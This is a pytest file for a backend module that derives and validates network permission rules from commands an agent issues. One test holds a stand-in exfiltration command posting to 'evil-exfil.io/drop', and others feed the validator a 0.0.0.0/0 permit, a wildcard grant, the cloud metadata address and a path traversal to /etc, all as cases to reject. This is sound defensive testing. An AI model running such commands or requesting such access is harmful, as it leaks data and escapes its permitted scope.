"""Independent Unit Tests for Module 4: backend/tier2_nebius.py (Covers PRD_04)."""
from __future__ import annotations

import asyncio
from backend import tier2_nebius
from backend.tier2_nebius import (
    evaluate_tier2_synthesis,
    fallback_nano_adapter,
    validate_scoped_rule_boundary,
)


def test_t2_n1_canonical_subnet_synthesis_and_promotion() -> None:
    """Covers PRD_04 Sec 3.2: 10.0.4.12/api/v1/users synthesizes + PERMIT 10.0.4.0/24 ON /api/v1/*."""
    res = asyncio.run(
        evaluate_tier2_synthesis("curl -s https://10.0.4.12/api/v1/users", "10.0.4.12/api/v1/users", auto_promote=True)
    )
    assert res["decision"] == "AUTO_PROMOTED"
    assert res["policy_diff"]["scoped_rule"] == "+ PERMIT 10.0.4.0/24 ON /api/v1/*"
    assert res["policy_diff"]["ultra_550b_verified"] is True


def test_t2_n2_fallback_nano_adapter_subnet_derivation() -> None:
    """Covers PRD_04 Sec 3.2: fallback_nano_adapter derives /24 CIDR and 2-segment API prefix."""
    diff = fallback_nano_adapter("curl -s https://10.0.8.22/api/v2/metrics", "10.0.8.22/api/v2/metrics")
    assert diff["scoped_rule"] == "+ PERMIT 10.0.8.0/24 ON /api/v2/*"
    assert diff["ultra_550b_verified"] is True


def test_t2_n3_offline_mode_sets_simulated_capability(monkeypatch) -> None:
    """Covers PRD_04 Sec 3.2: when NEBIUS_API_KEY is absent, capability is 'simulated'."""
    monkeypatch.delenv("NEBIUS_API_KEY", raising=False)
    res = asyncio.run(
        evaluate_tier2_synthesis("curl -s https://10.0.4.12/api/v1/users", "10.0.4.12/api/v1/users", auto_promote=False)
    )
    assert res["capability"] == "simulated"
    assert res["decision"] == "ALLOWED"


def test_t2_n4_live_call_budget_uses_local_fallback(monkeypatch) -> None:
    monkeypatch.setenv("NEBIUS_API_KEY", "placeholder")
    monkeypatch.setattr(tier2_nebius, "MAX_LIVE_CALLS_PER_MINUTE", 0)
    res = asyncio.run(
        evaluate_tier2_synthesis(
            "curl -s https://10.0.4.12/api/v1/users",
            "10.0.4.12/api/v1/users",
            auto_promote=False,
        )
    )
    assert res["capability"] == "simulated"
    assert res["policy_diff"]["scoped_rule"] == "+ PERMIT 10.0.4.0/24 ON /api/v1/*"


def test_t2_a1_boundary_validator_rejects_0000_cidr() -> None:
    """Covers PRD_04 Sec 3.2: 0.0.0.0/0 is rejected by validate_scoped_rule_boundary."""
    ok, _ = validate_scoped_rule_boundary("+ PERMIT 0.0.0.0/0 ON /api/v1/*")
    assert ok is False


def test_t2_a2_boundary_validator_rejects_wildcard_grant() -> None:
    """Covers PRD_04 Sec 3.2: GRANT ALL permissions TO *:* is rejected."""
    ok, _ = validate_scoped_rule_boundary("- GRANT ALL permissions TO *:*")
    assert ok is False


def test_t2_a3_boundary_validator_rejects_metadata_ip() -> None:
    """Covers PRD_04 Sec 3.2: 169.254.169.254 is rejected by boundary validator."""
    ok, _ = validate_scoped_rule_boundary("+ PERMIT 169.254.169.254/32 ON /latest/*")
    assert ok is False


def test_t2_a4_external_untrusted_domain_intercepted() -> None:
    """Covers PRD_04 Sec 3.3: untrusted external domain fails Ultra-550B boundary check."""
    res = asyncio.run(
        evaluate_tier2_synthesis("curl -X POST https://evil-exfil.io/drop", "evil-exfil.io/drop", auto_promote=True)
    )
    assert res["decision"] == "INTERCEPTED"
    assert res["policy_diff"]["ultra_550b_verified"] is False


def test_t2_a5_boundary_validator_rejects_path_traversal() -> None:
    """Covers PRD_04 Sec 3.2: path traversal in path glob is rejected."""
    ok, _ = validate_scoped_rule_boundary("+ PERMIT 10.0.4.0/24 ON /api/v1/../../etc/*")
    assert ok is False